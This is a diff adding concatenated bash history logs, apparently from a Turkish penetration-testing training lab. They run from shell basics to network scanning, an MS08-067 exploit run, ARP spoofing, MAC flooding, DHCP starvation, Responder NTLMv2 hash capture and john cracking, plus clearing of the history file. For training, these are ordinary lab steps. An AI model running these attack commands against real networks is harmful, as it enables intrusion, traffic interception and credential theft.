@@ -1,0 +1,2158 @@
+984  apropos  open 
+  985  apropos  open
+  986  apropos  file
+  987  whih apropos
+  988  which apropos
+  989  /usr/bin/apropos --hel
+  990  /usr/bin/apropos --help
+  991  apropos  man 
+  992  man man
+  993  man ffs 3
+  994  man ffs 1
+  995  man man
+  996  man ffs 3
+  997  man open
+  998  man open 2
+  999  man open 3
+ 1000  man open 4
+ 1001  apropos  --help
+ 1002  apropos  --usage
+ 1003  apropos  find
+ 1004  fping -a -r 1 -g 10.10.15.0/24 
+ 1005  fping -r 1 -a -g 10.10.15.0/24 
+ 1006  netstat -nlput
+ 1007  file calistir 
+ 1008  ./calistir 
+ 1009  /var/www/html/calistir 
+ 1010  ././///////////././././/////calistir
+ 1011  ../../../../var/www/html/calistir 
+ 1012  id
+ 1013  echo $PATH
+ 1014  which find
+ 1015  export PATH=$PATH:/var/www/html/
+ 1016  echo $PATH
+ 1017  calistir
+ 1018  history 
+ 1019  file calistir 
+ 1020  echo "test"
+ 1021  echo -n "test"
+ 1022  DEGER=1
+ 1023  echo $DEGER
+ 1024  echo -n $DEGER
+ 1025  cat deneme.c 
+ 1026  cat -a deneme.c 
+ 1027  cat -e deneme.c 
+ 1028  dos2unix deneme.c 
+ 1029  find /usr/ -name "*17-10*" 2>/dev/null 
+ 1030  searchsploit 08-67
+ 1031  searchsploit 08-067
+ 1032  find /usr/ -name 40279.py
+ 1033  cat -e /usr/share/exploitdb/exploits/windows/remote/40279.py
+ 1034  python /usr/share/exploitdb/exploits/windows/remote/40279.py
+ 1035  /usr/share/exploitdb/exploits/windows/remote/40279.py
+ 1036  cat -e /usr/share/exploitdb/exploits/windows/remote/40279.py
+ 1037  dos2unix  /usr/share/exploitdb/exploits/windows/remote/40279.py
+ 1038  cat -e /usr/share/exploitdb/exploits/windows/remote/40279.py
+ 1039  cat 
+ 1040  ls 
+ 1041  ls -l
+ 1042  ls -la
+ 1043  ls -1
+ 1044  ifconfig 
+ 1045  history 
+
+   49  >/root/.bash_history 
+   50  ls -l
+   51  ls -la
+   52  ls -lah
+   53  man ls
+   54  cp -R /etc/ .
+   55  vi deneme.c 
+   56  ./calistir 
+   57  echo $?
+   58  cat deneme.c 
+   59  cp -R /etc/ .
+   60  echo $?
+   61  touch dosya
+   62  touch dosya{1..10}
+   63  ls -l
+   64  rm -rf dosya*
+   65  date
+   66  echo "Tarih: `date`"
+   67  echo "Tarih: $(date)"
+   68  tarih=$(date)
+   69  echo $tarih
+   70  tarih=`date`
+   71  echo $tarih
+   72  vi deneme.py
+   73  cat deneme.
+   74  cat deneme.py 
+   75  vi deneme.py 
+   76  cat deneme.py 
+   77  chmod 755 deneme.py 
+   78  ./deneme.py 
+   79  cat deneme.py 
+   80  cat yokturboledosya 
+   81  cat do
+   82  echo "test" > yokturboledosya 
+   83  cat yokturboledosya 
+   84  > yokturboledosya 
+   85  cat yokturboledosya 
+   86  ./deneme.py 
+   87  cat deneme.py 
+   88  >  yokturboledosya 
+   89  >  /dev/null 
+   90  echo "test" > yokturboledosya 
+   91  cat /dev/null  > yokturboledosya 
+   92  cat yokturboledosya 
+   93  echo "test" > yokturboledosya 
+   94  cat yokturboledosya 
+   95  cat /dev/null  > yokturboledosya 
+   96  cat yokturboledosya 
+   97  ls -la /dev/null 
+   98  cat deneme.py 
+   99  ./deneme.py 
+  100  ./deneme.py 2>/dev/null 
+  101  ./deneme.py 1>/dev/null 
+  102  ./deneme.py >/dev/null 
+  103  ./deneme.py >/dev/null 2>/dev/null 
+  104  ./deneme.py >/dev/null 2&>1
+  105  ./deneme.py >output 2>error
+  106  cat output 
+  107  cat error 
+  108  hping3 -S -p 443 google.com -c 2 
+  109  hping3 -S -p 443 google.com -c 2  2>/dev/null 
+  110  fping -a -r 1 -g 10.10.15.0/24 
+  111  fping -a -r 1 -g 10.10.15.0/24 2>/dev/null 
+  112  fping -a -r 1 -g 10.10.15.0/24 >/dev/null 2>/dev/null; arp -na
+  113  fping -a -r 1 -g 10.10.15.0/24 >/dev/null 2>/dev/null; arp -na | grep -v "incomplete" | cut -d " " -f2
+  114  date
+  115  date | cut -d " " -f5
+  116  date | cut -d " " -f5-
+  117  date | cut -d " " -f5-6
+  118  echo "Saat: $(date | cut -d " " -f5)"
+  119  echo "Deneme" | tr -d "e"
+  120  echo "Deneme" | tr -s "e" "E"
+  121  echo "Deneme" | tr -s "e" "E" | tr [A-Z] [a-z]
+  122  ps -ef | grep ssh
+  123  ps -ef | grep ssh | cut -d " " -f6
+  124  ps -ef | grep ssh | cut -d " " -f7
+  125  ps -ef | grep ssh | cut -d " " -f8
+  126  ps -ef | grep ssh | cut -d " " -f9
+  127  ps -ef | grep ssh | tr -s " " "#" 
+  128  ps -ef | grep ssh | tr -s " " "#" | cut -d "#" -f2
+  129  ps -ef | grep ssh | awk -F " " '{print $2}'
+  130  date
+  131  date | awk -F ":" '{print $5}'
+  132  date | awk -F " " '{print $5}'
+  133  date | awk -F " " '{print $5,$6}'
+  134  cat /etc/passwd | head -3
+  135  cat /etc/passwd | tail -3 
+  136  cat /etc/passwd | head -4 
+  137  cat /etc/passwd | head -4  | tail -1
+  138  cat /etc/passwd | head -4  | tail -1 | cut -d ":" -f1
+  139  echo "Kullanici: $(cat /etc/passwd | head -4  | tail -1 | cut -d ":" -f1)"
+  140  echo "Kullanici: $(head -4 /etc/passwd   | tail -1 | cut -d ":" -f1)"
+  141  time echo "Kullanici: $(cat /etc/passwd | head -4  | tail -1 | cut -d ":" -f1)"
+  142  time echo "Kullanici: $(head -4 /etc/passwd   | tail -1 | cut -d ":" -f1)"
+  143  history  >> history1.txt 
+   22  nmap -n -Pn -sS -p 445 10.10.15.9 --script=smb-os-discovery 
+   23  cat windows.txt 
+   24  nmap -n -Pn -sS -p 445 -iL windows.txt --script=smb-os-discovery 
+   25  nmap -n -Pn -sS -p 445 10.10.15.181 --script=smb-os-discovery 
+   26  /etc/init.d/apache2 restart
+   27  ifconfig 
+   28  ls -la /usr/share/nmap/scripts/ | grep smb
+   29  nmap -n -Pn -sS -p 445 10.10.15.0/24 -oG - --randomize-hosts --min-hostgroup 32 --open | grep "445/open" | cut -d " " -f2 | tee windows.txt 
+   30  ls -la /usr/share/nmap/scripts/ | grep 17-
+   31  nmap -n -Pn -sS -p 445 10.10.15.0/24 -iL windows.txt --randomize-hosts --script=smb-vuln-ms17-010.nse -oA MS-17-010
+   32  nmap -n -Pn -sS -p 445  -iL windows.txt --randomize-hosts --script=smb-vuln-ms17-010.nse -oA MS-17-010
+   33  vi /var/www/html/nmap-web.txt
+   34  ifconfig 
+   35  ls -la MS-17-010.*
+   36  more MS-17-010.nmap
+   37  nmap -n -Pn -sS -p 445 10.10.15.176 --script=smb-os-discovery 
+   38  nmap -n -Pn -sS -p 10.10.15.176 1322
+   39  nmap -n -Pn -sS -p 10.10.15.176 -p 1322
+   40  nmap -n -Pn -sS -p 1322 10.10.15.176 
+   41  nmap -n -Pn -sS -p 1322 10.10.15.171 
+   42  nmap -n -Pn -sS -p 1322 10.10.15.171  -sV 
+   43  telnet 10.10.15.171 1322
+   44  ls -la /usr/share/nmap/scripts/ | grep -i ssh 
+   45  nmap --script-help=ssh-auth-methods.nse
+   46  nmap -n -Pn -sS -p 1322 10.10.15.171  --script=ssh-auth-methods.nse
+   47  nmap -n -Pn -sS -p 1322 10.10.15.171  --script=ssh-auth-methods.nse -sV
+   48  ls -la /usr/share/nmap/scripts/ | grep -i ssh 
+   49  ssh 10.10.15.171 -l user -p 1322
+   50  history  >> /var/www/html/komutlar2.txt 
+   51  >/root/.bash_history 
+   52  msfconsole 
+   53  history  >> /var/www/html/komutlar2.txt 
+   54  >/root/.bash_history 
+   55  ifconfig 
+   56  nmap -n -Pn -O 10.10.15.176
+   57  nmap -n -Pn -O 10.10.15.176 --stats-every 5
+   58  p0f  -i eth0 
+   59  p0f --help
+   60  p0f  -i eth0 'host 10.10.176'
+   61  p0f  -i eth0 
+   62  dmesg  | tail -2
+   63  wget https://raw.githubusercontent.com/bgasecurity/network-security-scripts/master/detect-sniffer.py
+   64  chmod 755 detect-sniffer.py 
+   65  ./detect-sniffer.py 
+   66  ifconfig 
+   67  ./detect-sniffer.py  -d 10.10.15.0/24
+   68  vi detect-sniffer.py 
+   69  arp-scan -l -I eth0 
+   70  arp-scan -l -I eth0  | grep -E "^[0-9]{1,3}\." | awk '{print $1}' | tee up.ipler
+   71  wc -l up.ipler 
+   72  nmap -n -Pn -sS -p 445 -iL up.ipler  --open -oG -  
+   73  nmap -n -Pn -sS -p 445 -iL up.ipler  --open -oG -  | grep "445/open"
+   74  nmap -n -Pn -sS -p 445 -iL up.ipler  --open -oG -  | grep "445/open" | cut -d " " -f2 | tee windows.txt
+   75  whatweb  http://www.izmitsu.com.tr 
+   76  ping -c 2 10.10.15.5
+   77  history  >> /var/www/html/komutlar2.txt 
+   78  shutdown -r now
+   79  vi policy_parse.rb 
+   80  62
+   81  vi policy_parse.rb 
+   82  rm -rf policy_parse.rb 
+   83  mv policy_parse_galkan.rb policy_parse.rb 
+   84  vi policy_parse.rb 
+   85  cd ..
+   86  ls -l
+   87  rm -rf log_parser*
+   88  ls -l
+   89  ifconfig 
+   90  /etc/init.d/ssh restart
+   91  unzip AppGuard_LogParser_Script-20190928T065004Z-001.zip 
+   92  cd AppGuard_LogParser_Script/
+   93  ls -l
+   94  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  > /root/Desktop/report.html
+   95  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+   96  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  > 
+   97  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+   98  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | grep -E "CORE. Process tree: "
+   99  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | grep -E "CORE. Process tree: \."
+  100  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | grep -E "CORE. Process tree: " | more
+  101  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | grep -E "CORE. Process tree: " > dosya
+  102  less dosya 
+  103  rm -rf dosya 
+  104  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | grep -E "CORE. Process tree: " 
+  105  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | grep -E "CORE. Process tree: "  | grep -i postur
+  106  grep -REi Search *
+  107  grep -REi Search * | more
+  108  ls -al
+  109  grep -iE search Agent6.3.7_JTBGroup_HBU-OUTPUT.html 
+  110  grep -iE "*search*" Agent6.3.7_JTBGroup_HBU-OUTPUT.html 
+  111  ls -l
+  112  less html_constants.rb 
+  113  ls -l
+  114  cat solutions.csv 
+  115  ls -la
+  116  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   
+  117  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep -E "CORE. "
+  118  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep -Ei "CORE\. Process tree: \/" 
+  119  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep -Ei "CORE\. Process tree: \." 
+  120  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep -Ei "CORE\. Process tree: " 
+  121  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep -Ei "CORE\. Process tree: \." 
+  122  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep -Ei "CORE\. Process tree: "  | more
+  123  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    > /root/Desktop/report.html 
+  124  vi /root/Desktop/report.html 
+  125  grep -Ei "CORE. Process tree: \." /root/Desktop/report.html 
+  126  vi /root/Desktop/deneme.html
+  127  vi /root/Desktop/deneme.html 
+  128  rm -rf  /root/Desktop/deneme.html 
+  129  vi policy_parse.rb 
+  130  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    > /root/Desktop/report.html 
+  131  vi /root/Desktop/report.html 
+  132  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    > /root/Desktop/report.html 
+  133  gem search htmlent
+  134  gem install htmlentities
+  135  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    > /root/Desktop/report.html 
+  136  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    
+  137  ruby policy_parse.rb -l Agent6.3.7_JTBGroup_HBU.csv -s  solutions.csv    
+  138  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    > /root/Desktop/report.html/report.html 
+  139  ruby policy_parse.rb 
+  140  ruby policy_parse.rb -l Agent6.3.7_JTBGroup_HBU.csv -l solutions.csv 
+  141  ruby policy_parse.rb -l Agent6.3.7_JTBGroup_HBU.csv -s solutions.csv 
+  142  ruby policy_parse.rb -l Agent6.3.7_JTBGroup_HBU.csv -l solutions.csv 
+  143  ruby policy_parse.rb -l Agent6.3.7_JTBGroup_HBU.csv -s solutions.csv 
+  144  ruby policy_parse.rb -l Agent6.3.7_JTBGroup_HBU.csv -s solutions.csv > /root/Desktop/report.html 
+  145  ls -l
+  146  cd ..
+  147  ls -l
+  148  rm -rf AppGuard_LogParser_Script-20190928T065004Z-001.zip 
+  149  cd AppGuard_LogParser_Script/
+  150  ls -l
+  151  ruby policy_parse.rb  
+  152  ruby policy_parse.rb  -l Agent6.3.7_JTBGroup_HBU.csv  -s solutions.csv > /root/Desktop/report.html
+  153  IFCON
+  154  ifconfig 
+  155  dhclient eth0 -v
+  156  /etc/init.d/ssh restart
+  157  cd ..
+  158  ls -l
+  159  mv 'Log Parser V1.1-20190930T120459Z-001.zip' Log_Parser_V1.1-20190930T120459Z-001.zip 
+  160  unzip Log_Parser_V1.1-20190930T120459Z-001.zip 
+  161  ls -la
+  162  cd Log\ Parser\ V1.1/
+  163  ls -la
+  164  ruby policy_parse.rb  -l Agent6.3.7_JTBGroup_HBU.csv  -s solutions.csv > /root/Desktop/report.html
+  165  cp ../AppGuard_LogParser_Script/solutions.csv .
+  166  ruby policy_parse.rb  -l Agent6.3.7_JTBGroup_HBU.csv  -s solutions.csv > /root/Desktop/report.html
+  167  ruby policy_parse.rb  Agent6.3.7_JTBGroup_HBU.csv   solutions.csv > /root/Desktop/report.html
+  168  cd /root/Desktop/
+  169  ls -la
+  170  dhclient eth0 -v
+  171  apt-get clean all; apt-get update
+  172  apt-cache search tesseract
+  173  apt-cache search tesseract | more
+  174  apt-get install tesseract-ocr -y 
+  175  tesseract --help
+  176  man tesseract
+  177  tesseract CaptchaImage.jpeg --psm 8 
+  178  tesseract CaptchaImage.jpeg --psm 9 
+  179  tesseract CaptchaImage.jpeg 
+  180  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg 
+  181  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 0
+  182  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 1
+  183  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 2
+  184  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 
+  185  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 3
+  186  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 4
+  187  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 5
+  188  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 6
+  189  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 7
+  190  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 5
+  191  cat CaptchaImage2.jpeg.txt 
+  192  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 6
+  193  cat CaptchaImage2.jpeg.txt 
+  194  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 7
+  195  cat CaptchaImage2.jpeg.txt 
+  196  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 8
+  197  cat CaptchaImage2.jpeg.txt 
+  198  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 9
+  199  cat CaptchaImage2.jpeg.txt 
+  200  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 10
+  201  cat CaptchaImage2.jpeg.txt 
+  202  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 6
+  203  cat CaptchaImage2.jpeg.txt 
+  204  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 7
+  205  cat CaptchaImage2.jpeg.txt 
+  206  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 5
+  207  cat CaptchaImage2.jpeg.txt 
+  208  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 4
+  209  cat CaptchaImage2.jpeg.txt 
+  210  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 3
+  211  cat CaptchaImage2.jpeg.txt 
+  212  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 2
+  213  cat CaptchaImage2.jpeg.txt
+  214  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 1
+  215  cat CaptchaImage2.jpeg.txt
+  216  ls -l
+  217  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 6
+  218  cat CaptchaImage2.jpeg.txt
+  219  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 7
+  220  cat CaptchaImage2.jpeg.txt
+  221  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 8
+  222  cat CaptchaImage2.jpeg.txt
+  223  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 9
+  224  cat CaptchaImage2.jpeg.txt
+  225  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 10
+  226  cat CaptchaImage2.jpeg.txt
+  227  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 11
+  228  cat CaptchaImage2.jpeg.txt
+  229  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 12
+  230  cat CaptchaImage2.jpeg.txt
+  231  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 13
+  232  cat CaptchaImage2.jpeg.txt
+  233  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 14
+  234  cd ..
+  235  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv > /root/Desktop/report.html
+  236  ls -l
+  237  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv > /root/Desktop/report.html
+  238  ls -l
+  239  mv policy_parse.rb policy_parse_galkan.rb 
+  240  vi policy_parse.rb 
+  241  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv > /root/Desktop/report.html
+  242  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv 
+  243  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  | more
+  244  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  > /root/Desktop/report.html 
+  245  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+  246  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | more
+  247  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | less
+  248  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | more
+  249  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | wc -l
+  250  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  > /root/Desktop/report.html 
+  251  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+  252  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | more
+  253  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   
+  254  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep "CORE. Process tree: ."
+  255  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep "CORE\. Process tree: \."
+  256  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep "CORE. Process tree:" | more
+  257  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    
+  258  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv     | grep "CORE. Process tree: ."
+  259  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv     | grep "CORE. Process tree: ." | more
+  260  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv     | grep -E "CORE\. Process tree: \." 
+  261  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv     
+  262  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process
+  263  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process"
+  264  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: "
+  265  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep -v "CORE. Process tree: <"
+  266  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: \."
+  267  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: <"
+  268  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: ."
+  269  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: ." | more
+  270  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+  271  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+  272  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   > /root/Desktop/report.html
+  273  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   
+  274  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | more
+  275  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   
+  276  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | more
+  277  ls -l
+  278  cd ..
+  279  cd AppGuard_LogParser_Script/
+  280  vi policy_parse.rb 
+  281  cd ..
+  282  cd AppGuard_LogParser_Script/
+  283  ifconfig 
+  284  dhclient eth0 -
+  285  dhclient eth0 -v
+  286  pkill dhclient
+  287  dhclient eth0 -v
+  288  ifconfig 
+  289  arp-scan -l -I eth0 
+  290  nmap -n -Pn -sS --top-ports 10.10.15.33 --open
+  291  nmap -n -Pn -sS --top-ports 20 10.10.15.33 --open
+  292  nmap -n -Pn -sS -p 80 10.10.15.33 --open
+  293  nmap -n -Pn -sS -p 80 -D 1.1.1.1,2.2.2.2,3.3.3.3 10.10.15.33 --open 
+  294  nmap -n -Pn -sS -p 80 -D RND:5 10.10.15.33 --open 
+  295  ifconfig 
+  296  ip addr del 10.10.15.170 dev eth0 
+  297  pkill dhclient
+  298  ifconfig 
+  299  tcpdump -tttnn -i eth0 
+  300  ifconfig  eth0 172.16.155.156 netmask 255.255.255.0  up; arping -c 1 172.16.155.156; ip addr del 172.16.155.156 dev eth0 
+  301  ifconfig  eth0 172.16.155.139 netmask 255.255.255.0  up; arping -c 1 172.16.155.139; ip addr del 172.16.155.139 dev eth0 
+  302  ifconfig  eth0 172.16.155.156 netmask 255.255.255.0  up
+  303  ifconfig 
+  304  route -n
+  305  tcpdump -tttnn -i eth0 
+  306  ls -la /usr/share/nmap/scripts/ | grep ip-fo
+  307  nmap --script-help=ip-forwarding.nse
+  308  nmap -sn 172.16.155.2   --script ip-forwarding --script-args='target=8.8.8.8'
+  309  nmap -sn 172.16.155.3   --script ip-forwarding --script-args='target=8.8.8.8'
+  310  ifconfig 
+  311  nmap -sn 172.16.155.4   --script ip-forwarding --script-args='target=8.8.8.8'
+  312  nmap -sn 172.16.155.2   --script ip-forwarding --script-args='target=8.8.8.8'
+  313  route add default gw 172.16.155.2
+  314  nmap -n -Pn -sU -p 53 --open 172.16.155.0/24 --min-hostgroup 128 
+  315  dig @172.16.155.2 google.com A +SHORT
+  316  dig @172.16.155.2 google.com A +short
+  317  nmap -n -Pn -sU -p 53 --open 172.16.155.0/24 --min-hostgroup 128 
+  318  dig @172.16.155.2 google.com A +short
+  319  dig @172.16.155.254 google.com A +short
+  320  echo "172.16.155.2" > /etc/resolv.conf 
+  321  ping google.com -c 2
+  322  echo "nameserver 172.16.155.2" > /etc/resolv.conf 
+  323  ping google.com -c 2
+  324  ls -la /usr/share/nmap/scripts/ | grep recu
+  325  nmap 
+  326  ls -la /usr/share/nmap/scripts/ | grep waf
+  327  nmap -n -Pn -sS -p 80,443 --script=http-waf-detect.nse 172.16.155.156
+  328  tcpdump -tttnn -i eth0 host 10.10.15.5
+  329  traceroute www.izmitsu.com.tr 
+  330  traceroute www.izmitsu.com.tr -n
+  331  tcptraceroute -h www.izmitsu.com.tr -p 80 -n
+  332  tcptraceroute www.izmitsu.com.tr  80 -n
+  333  intrace  -h www.izmitsu.com.tr -p 80
+  334  tcpdump -tttnn -i eth0 proto ICMP
+  335  tcpdump -tttnn -i eth0 proto ICMP and proto UDP
+  336  tcpdump -tttnn -i eth0 proto ICMP and  UDP
+  337  tcpdump -tttnn -i eth0 proto ICMP and proto UDP
+  338  tcpdump -tttnn -i eth0 proto ICMP and UDP
+  339  tcpdump -tttnn -i eth0 proto '(ICMP and UDP)'
+  340  tcpdump -tttnn -i eth0 proto "(ICMP and UDP)"
+  341  tcpdump -tttnn -i eth0 "ICMP and UDP"
+  342  tcpdump -tttnn -i eth0 ICMP and UDP
+  343  tcpdump -tttnn -i eth0 icmp
+  344  tcpdump -tttnn -i eth0 icmp and udp
+  345  tcpdump -tttnn -i eth0 icmp and UDP
+  346  tcpdump -tttnn -i eth0 icmp or UDP
+  347  tcpdump -tttnn -i eth0 icmp or udp
+  348  tcpdump -tttnn -i eth0 proto ICMP or proto UDP
+  349  tcpdump -tttnn -i eth0 proto ICMP and proto UDP
+  350  tcpdump -tttnn -i eth0 proto ICMP or proto UDP
+  351  tcpdump -tttnn -i eth0 src host 192.168.1.1 and proto TCP
+  352  tcpdump -tttnn -i eth0 src host 192.168.1.2 and proto TCP
+  353  tcpdump -tttnn -i eth0 dst port 80 and proto TCP and dst host 10.10.10.1
+  354  dig www.izmitsu.com.tr A +short
+  355  cat /etc/resolv.conf 
+  356  tcpdump -tttnn -i eth0 port 53 and proto UDP -s 0 -XX
+  357  tcpdump -tttnn -i eth0 port 53 and proto UDP -s 0 
+  358  tcpdump -tttnn -i eth0 port 53 and proto UDP -s 0 -w dns.pcap
+  359  wireshark dns.pcap 
+  360  cd /root/Desktop/
+  361  file dns.dat 
+  362  cat dns.dat 
+  363  cd ..
+  364  wireshark dns.pcap 
+  365  cd DE
+  366  cd Desktop/
+  367  tcpdump -tttnn -i eth0 port 53 and proto UDP -s 0 
+  368  ping google.com -c 2
+  369  cd ..
+  370  echo "http://www.bga.com.tr" | grep -E "^https?://"
+  371  echo "https://www.bga.com.tr" | grep -E "^https?://"
+  372  echo "ftp://www.bga.com.tr" | grep -E "^https?://"
+  373  echo "ftp://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  374  echo "ftps://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  375  echo "https://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  376  echo "http://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  377  echo "smtp://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  378  history  >> /var/www/html/komutlar2.txt 
+  379  netstat -nlput | grep 8080
+  380  ngrep --help
+  381  ngrep --help | more
+  382  ngrep -i eth0 "SSH"
+  383  ngrep -q -i eth0 "SSH"
+  384  ngrep -q  "SSH"
+  385  ngrep --help | more
+  386  ngrep -qi  "SSH-]"
+  387  ngrep -qi  "SSH\-[0-9]+\.[0-9]+"
+  388  dhclient eth0 -v
+  389  sysctl -a | grep forward
+  390  ifconfig 
+  391  sysctl -a | grep forward
+  392  sysctl  -w net.ipv4.ip_forward=1
+  393  arpspoof  -i eth0 -t 172.16.155.138 172.16.155.2
+  394  dpkg -S arpspoof
+  395  arpspoof  -i eth0 -t 172.16.155.138 172.16.155.2
+  396  arp -na
+  397  arp -s 172.16.155.2 00:50:56:e2:59:94
+  398  arp -na
+  399  tcpdump -tttnn -i eth0 -e 
+  400  macof -i eth0 
+  401  ifconfig  eth0 
+  402  ifconfig eth0 down
+  403  macchanger  -r eth0 
+  404  ifconfig  eth0 up
+  405  dhclient eth0
+  406  ifconfig eth0 
+  407  ls -l
+  408  ./dhcp_starvation.sh 
+  409  ./dhcp_starvation.sh eth0 5
+  410  ifconfig 
+  411  wireshark 
+  412  vi /etc/responder/Responder.conf 
+  413  responder -I eth0 -d -r w -b 1 -f -F 
+  414  cat /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  415  john --fork=2 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
